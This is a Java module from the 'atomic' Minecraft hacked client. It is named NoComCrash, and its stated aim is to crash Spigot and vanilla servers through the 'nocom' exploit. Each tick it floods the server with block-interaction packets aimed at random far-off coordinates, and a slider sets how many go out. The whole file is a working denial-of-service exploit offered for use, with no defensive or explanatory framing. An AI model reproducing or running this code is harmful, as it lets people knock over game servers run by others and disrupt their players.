/*
 * This file is part of the atomic client distribution.
 * Copyright (c) 2021. 0x150 and contributors
 */

package me.zeroX150.atomic.feature.module.impl.exploit;

import me.zeroX150.atomic.Atomic;
import me.zeroX150.atomic.feature.module.Module;
import me.zeroX150.atomic.feature.module.ModuleType;
import me.zeroX150.atomic.feature.module.config.SliderValue;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Objects;
import java.util.Random;

public class NoComCrash extends Module {
    final SliderValue packets = (SliderValue) this.config.create("Packets per tick", 5, 1, 100, 0).description("How many packets to send per tick");
    final Random r = new Random();
    int i = 0;

    public NoComCrash() {
        super("NoComCrash", "Crashes spigot and vanilla server using the nocom exploit", ModuleType.EXPLOIT);
    }

    @Override
    public void tick() {
        for (int i = 0; i < packets.getValue(); i++) {
            Vec3d cpos = pickRandomPos();
            PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, new BlockPos(cpos), false));
            Objects.requireNonNull(Atomic.client.getNetworkHandler()).sendPacket(packet);
            this.i++;
        }
    }

    Vec3d pickRandomPos() {
        int x = r.nextInt(16777215);
        int y = 255;
        int z = r.nextInt(16777215);
        return new Vec3d(x, y, z);
    }

    @Override
    public void enable() {

    }

    @Override
    public void disable() {
        i = 0;
    }

    @Override
    public String getContext() {
        return i == 0 ? "Waiting" : i + " " + (i == 1 ? "packet" : "packets") + " sent";
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}

